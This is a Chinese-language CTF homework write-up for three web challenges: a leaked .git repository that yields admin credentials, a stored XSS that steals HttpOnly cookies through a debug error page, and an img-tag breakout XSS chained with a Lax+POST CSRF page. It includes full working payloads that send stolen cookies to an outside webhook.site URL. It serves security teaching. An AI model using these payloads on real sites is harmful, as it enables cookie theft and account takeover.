---
tags: 2020 程式安全
---
# HW4
## The Stupid Content Tracker
### 題目分析
* 題目給了一個網址`https://edu-ctf.csie.org:44302/.git/`
* 但是點進去是403 forbidden看不到任何東西
### 漏洞
* 從網站的url可以看到是一個.git的目錄所以存在git的洩漏
* 可以使用githack等工具把把整個repository給dump下來
### Exploit
* 利用githack把整個repositoy給dump下來之後會看到有一個資料夾和index.html  
![](https://i.imgur.com/8O58ViY.png)
* 進去看admin_portal_non_production的資料夾裡面有一個index.php內容是
```php=
<?php
    echo getenv("FLAG");
?>
```
* 所以知道如果能夠進入https://edu-ctf.csie.org:44302/admin_portal_non_production/index.php就能拿到flag
* 嘗試進入後會發現需要帳號密碼  
![](https://i.imgur.com/BXQaUrC.png)
* 再回去看剛剛dump下來的東西用git log查看所有使用git的紀錄
* 可以發現有一次commit有新增一個叫做password的檔案  
![](https://i.imgur.com/YSl24GA.png)
* 接著用git diff 2577a去看那次的commit和當前的版本有甚麼差別
* 可以看到和2577a那次的版本比少掉的部分是紅字的部分
![](https://i.imgur.com/Bp3qk6M.png)
* 移除掉的了內容是`thewebmaster:ols2Xrmdja7XaaMP`所以可以知道應該就是登入的帳號和密碼
* 嘗試登入後就成功拿到flag了  
![](https://i.imgur.com/ffpiscO.png)
>FLAG{_man_git_THe_StUPid_CONtEnt_TrAcKEr......}

## Zero Note Revenge
### 題目分析
* 題目是一個留言的地方可以在上面留言點擊就能夠看到之前留的內容
* 也可以把內容傳給admin叫admin去看
### 漏洞
* 沒有對輸入的內容作過濾所以存在XSS的漏洞
* 錯誤訊息沒有隱藏起來而是完整的顯示出來導致訊息的洩漏
### Exploit
* 因為有XSS的漏洞所以就可以構造payload來執行javascript來偷到使用者的cookie
* 因為這題目標的cookie是http only的所以不能直接使用javascript的document.cookie來獲取cookie
* 但是因為錯誤訊息沒有隱藏起來上面會有發出request時帶上的所有內容
* 嘗試訪問一個不存在的note會發現他錯誤訊息裡面有cookie即使是http only的cookie也會出現在上面  
![](https://i.imgur.com/j1Qp7lF.png)
* 所以就可以構造一個payload讓點擊note的人去訪問不存在的頁面因為頁面不存在所以response裡面的內容是發起request時的header的內容
* 最後再把response的內容回傳給我們就能拿到http only的cookie了
```javascript=
<script>
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
a = httpGet('https://edu-ctf.csie.org:44301/note/12345')
fetch('https://webhook.site/5c0a633f-8078-42f6-ba67-3fabb65a4597?' + btoa(a))
</script>
```
>FLAG{Oh_I_f0rg0t_To_disAble_The_deBug_PagE}
##  Zero Meme
### 題目分析
* 題目打開是一張圖片可以給他新的網址去更新那張圖片
* 也可以把網址傳給admin讓admin去點擊那個網址
### 漏洞
* 存在xss的漏洞
* 因為Lax+POST的關係有兩分鐘的時間可以做到CSFR
### Exploit
* 在更新圖片的地方因為沒有對輸入的東西做檢查所以可以把img標籤閉合掉之後塞上\<script\>...\</script\>就能夠成功構造出一個script標籤去執行javascript的code
```=
https://i.imgflip.com/4mc8aj.jpg"><script>alert(1)</script>
```
* 這樣就能夠成功把img閉合掉然後產生一個script的標籤並執行alert(1)
![](https://i.imgur.com/wK7Rt7G.png)
* 因為cookie預設samesite是Lax所以在訪問不同origin網站時cookie不會被帶上
* 原本samesite對cross-site request送cookie的行為將預設被關閉但是因為Lax+POST的關係所以如果剛登入並且是用post的方式發request有兩分鐘的時間cookie可以對外發出的
* 因此就可以利用這兩分鐘的時間來做CSFR來偷到cookie而題目設計是admin每次看我們發送過去的網址都是剛登入的狀態就符合Lax+POST的規則
* 構造一個網頁讓使用者連上之後就對`https://zero-meme.edu-ctf.bookgin.tw:44303/me`送post然後內容是把img閉合掉之後用構造script標籤來執行js的code來把cookie傳送出來
* 這樣當admin點擊這個構造的惡意的網頁就會對`/me`發起post之後就會把cookie往外傳給我們
```htmlembedded=
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
</head>
<body>
    <form id="csfr" method="POST" action="https://zero-meme.edu-ctf.bookgin.tw:44303/me">
        <input type="text" name="intro" value=aaa>
    </form>
    
    <script>
        const a = "https://i.imgflip.com/4mc8aj.jpg\"\>\<script\>fetch('https://webhook.site/5c0a633f-8078-42f6-ba67-3fabb65a4597?cookie=' + btoa(document.cookie))\<\/script\>";
        document.getElementById('csfr')[0].value = a;
        document.getElementById("csfr").submit();
    </script>

</body>
</html>
```
>FLAG{Will_samesite_cookies_by_default_puts_the_final_nail_in_the_CSRF_coffin?}